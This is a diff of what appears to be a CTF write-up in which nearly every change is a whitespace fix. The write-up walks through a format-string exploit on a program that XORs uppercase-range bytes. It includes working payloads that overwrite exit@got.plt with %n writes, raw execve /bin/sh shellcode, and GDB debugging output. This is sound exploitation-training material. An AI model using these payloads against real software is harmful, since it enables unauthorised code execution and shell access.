@@ -1,14 +1,14 @@
 
 => We have a fgets that fill a buffer at most 100 bytes
-=> The loop modify value of the buffer's values between "@" and "[" 
+=> The loop modify value of the buffer's values between "@" and "["
 => Every values between 0x41 - 0x5a is modified by a XOR 0x20
-=> The buffer is then printed 
+=> The buffer is then printed
 
 
-=> Let's try to fill the buffer of "A"  
-=> It doesn't touch the ret addr of main 
-=> We can see that the buffer in printed with the printf function without the format protection 
-=> Then we have string format exploit 
+=> Let's try to fill the buffer of "A"
+=> It doesn't touch the ret addr of main
+=> We can see that the buffer in printed with the printf function without the format protection
+=> Then we have string format exploit
 
 => We will try to overwrite the exit plt by an address pointing to an address in our buffer
 pointing to NOP slide and a shell code
@@ -28,7 +28,7 @@ pointing to NOP slide and a shell code
 => We create the payload to overwrite exit@got.plt
 
 => Firstly we calcul the offset from an arbitrary address write at the start of our buffer
-r < <(python -c 'print "AAAA" + "%p "*15') 
+r < <(python -c 'print "AAAA" + "%p "*15')
 aaaa0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd664 (nil) 0x61616161 <- Found
 
 => Offset: 10
@@ -46,7 +46,7 @@ r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54759x" + "%1
 
 
 => It works it's catch by the SIGTRAP
-=> Then we replace the \xcc by the NOP slide and the shell code 
+=> Then we replace the \xcc by the NOP slide and the shell code
 
 
 r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54759x" + "%10$n" + "%10768x" + "%11$hn" + "\x90"*(62-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
@@ -55,15 +55,15 @@ r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54759x" + "%1
 Program received signal SIGSEGV, Segmentation fault.
 0xffffd66d in ?? ()
 
-=> Which is a address nowhere 
-=> Let's check the stack 
+=> Which is a address nowhere
+=> Let's check the stack
 0xffffd5ec:	0x90909090	0x90909090	0x90909090	0x31909090
 0xffffd5fc:	0x2f6870c0	0x6868732f	0x6e69622f	0xc189e389
 
 => Look at the start of our shellcode 31 c0 70
-=> The 0x50 has been transformed to 0x70 
+=> The 0x50 has been transformed to 0x70
 => It's because we forget that every value [0x41 - 0x5a] are modified with XOR 0x20
-=> Let's replace this place with a different instruction 
+=> Let's replace this place with a different instruction
 
 0:  31 c0                   xor    eax,eax
 2:  50                      push   eax
